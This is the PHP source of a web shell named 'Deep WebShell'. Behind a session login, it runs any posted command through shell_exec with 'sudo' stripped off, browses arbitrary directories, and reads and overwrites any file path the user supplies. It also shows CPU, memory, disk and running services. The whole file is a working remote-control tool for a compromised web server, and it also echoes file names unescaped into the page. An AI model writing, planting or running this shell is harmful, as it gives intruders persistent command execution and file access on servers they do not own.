<?php

/*Deep WebShell | Made by: https://github.com/BryanApolonio*/

session_start();

if (!isset($_SESSION['logged_in'])) {
    header("Location: index.php");
    exit;
}

if (time() - $_SESSION['last_activity'] > 600) {
    session_unset();
    session_destroy();
    header("Location: index.php?msg=expired");
    exit;
}

$_SESSION['last_activity'] = time();

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (is_dir($current_dir)) {
    chdir($current_dir);
}
$display_dir = basename($current_dir) ?: 'root';

$sys_user = $_SESSION['sys_user'];
$sys_pass = $_SESSION['sys_pass'];
$sys_host = trim(shell_exec('hostname') ?: 'localhost');

if (!isset($_SESSION['terminal_log'])) {
    $_SESSION['terminal_log'] = [];
}

if (isset($_POST['cmd'])) {
    $raw_cmd = trim($_POST['cmd']);

    if ($raw_cmd === 'clear') {
        $_SESSION['terminal_log'] = [];
    } elseif ($raw_cmd !== '') {
        $cmd = preg_replace('/^sudo\s+/', '', $raw_cmd);
        $parts = explode(' ', $cmd);
        $base_cmd = $parts[0];

        if ($base_cmd === 'cd') {
            $target_dir = isset($parts[1]) ? $parts[1] : $_SESSION['sys_user_home'] ?? '/home';
            $new_path = realpath($current_dir . DIRECTORY_SEPARATOR . $target_dir);

            if ($new_path && is_dir($new_path)) {
                header("Location: ?dir=" . urlencode($new_path));
                exit;
            } else {
                $result = "bash: cd: $target_dir: No such file or directory";
            }
        } elseif (in_array($base_cmd, ['nano', 'vi', 'vim', 'edit']) && isset($parts[1])) {
            header("Location: ?dir=" . urlencode($current_dir) . "&edit=" . urlencode($parts[1]));
            exit;
        } else {
            $exec_cmd = "cd " . escapeshellarg($current_dir) . " && $cmd 2>&1";
            $result = shell_exec($exec_cmd);
        }

        if (isset($result)) {
            array_unshift($_SESSION['terminal_log'], [
                'user' => $sys_user,
                'host' => $sys_host,
                'dir' => $display_dir,
                'cmd' => $raw_cmd,
                'output' => $result
            ]);
        }
    }
}

if (isset($_POST['save_file'])) {
    file_put_contents($_POST['file_path'], $_POST['content']);
    header("Location: ?dir=" . urlencode($current_dir) . "&edit=" . urlencode($_POST['file_path']));
    exit;
}

$editing_file = isset($_GET['edit']) ? $_GET['edit'] : '';
$cpu = shell_exec("top -bn1 | grep 'Cpu(s)' | awk '{print $2}'") ?: '0.0';
$ram = shell_exec("free | grep Mem | awk '{printf \"%.1f\", $3/$2 * 100}'") ?: '0.0';
$disk = shell_exec("df / | awk 'NR==2 {print $5}' | sed 's/%//'") ?: '0.0';
$services = shell_exec("systemctl list-units --type=service --state=running | head -n 8 | awk '{print $1}' | tail -n +2");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Deep Shell <?php echo $sys_user; ?></title>
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <aside class="sidebar">
        <div class="scroll-area">
            <h3>Stats</h3>
            <div class="stat-item">CPU: <?php echo $cpu; ?>%</div>
            <div class="stat-item">RAM: <?php echo $ram; ?>%</div>
            <div class="stat-item">DISK: <?php echo $disk; ?>%</div>

            <h3>Services</h3>
            <div class="stat-item"><?php echo nl2br($services ?: "None"); ?></div>

            <h3>Files</h3>
            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="file-item">📁 [Parent]</a>
            <?php 
            foreach (scandir($current_dir) as $f) {
                if ($f == '.' || $f == '..') continue;
                $p = $current_dir . DIRECTORY_SEPARATOR . $f;
                $isD = is_dir($p);
                echo "<a href='" . ($isD ? "?dir=" . urlencode($p) : "?dir=" . urlencode($current_dir) . "&edit=" . urlencode($p)) . "' class='file-item'>" . ($isD ? "📁 " : "📄 ") . $f . "</a>";
            } 
            ?>
        </div>
    </aside>

    <main class="main-content">
        <div class="box-terminal">
            <?php if (!$editing_file): ?>
                <form method="POST">
                    <div class="input-line">
                        <span class="user-host"><?php echo $sys_user; ?>@<?php echo $sys_host; ?></span>:<span class="dir-path">~/<?php echo $display_dir; ?></span>$
                        <input type="text" name="cmd" class="term-input" autofocus autocomplete="off">
                    </div>
                </form>

                <div class="terminal-body">
                    <?php foreach ($_SESSION['terminal_log'] as $log): ?>
                        <div class="term-line">
                            <div class="stat-item">
                                <span class="user-host"><?php echo $log['user']; ?>@<?php echo $log['host']; ?></span>:<span class="dir-path">~/<?php echo $log['dir']; ?></span>$ <?php echo htmlspecialchars($log['cmd']); ?>
                            </div>
                            <?php if ($log['output']): ?>
                                <div class="term-output"><?php echo htmlspecialchars($log['output']); ?></div>
                            <?php endif; ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php else: ?>
                <div class="editor-container">
                    <div class="editor-header">Editing File: <?php echo basename($editing_file); ?></div>
                    <form method="POST" class="editor-form">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($editing_file); ?>">
                        <textarea id="editor" name="content" spellcheck="false"><?php echo htmlspecialchars(@file_get_contents($editing_file)); ?></textarea>
                        <div class="footer-actions">
                            <button type="submit" name="save_file" class="btn-save">EDIT</button>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn-abort">ABORT</a>
                        </div>
                    </form>
                </div>
            <?php endif; ?>
        </div>
    </main>
</body>
</html>
